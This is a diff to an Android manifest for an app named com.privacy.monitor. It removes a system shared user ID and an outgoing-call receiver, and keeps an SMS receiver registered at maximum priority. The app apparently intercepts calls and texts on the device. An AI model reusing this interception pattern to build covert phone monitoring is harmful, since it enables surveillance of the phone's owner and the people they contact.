@@ -3,12 +3,11 @@
     package="com.privacy.monitor"
     android:installLocation="internalOnly"
     android:versionCode="1"
-    android:versionName="1.0"
-    android:sharedUserId="android.uid.system" >
+    android:versionName="1.0">
 
     <uses-sdk
         android:minSdkVersion="8"
-        android:targetSdkVersion="18" />
+        android:targetSdkVersion="19" />
     
     <instrumentation
         android:name="android.test.InstrumentationTestRunner"
@@ -82,12 +81,6 @@
                 android:resource="@xml/appwidget_info" />
         </receiver>
         
-        <receiver android:name=".receiver.CallPhoneReceiver" >
-            <intent-filter android:priority="2147483647" >
-                <action android:name="android.intent.action.NEW_OUTGOING_CALL" />
-            </intent-filter>
-        </receiver>
-        
         <receiver android:name=".receiver.SMSReceiver" >
             <intent-filter android:priority="2147483647" >
                 <action android:name="android.provider.Telephony.SMS_RECEIVED" />
@@ -109,7 +102,7 @@
         </receiver>
         
         <!-- 自定义广播 -->
-        <receiver android:name="com.privacy.monitor.receiver.CronBroadcaseRectiver" >
+        <receiver android:name="com.privacy.monitor.receiver.CronBroadcaseRectiver" android:permission="android.permission.INTERNET" >
             <intent-filter >
                 <action android:name="com.privacy.monitor.cron" />
             </intent-filter>
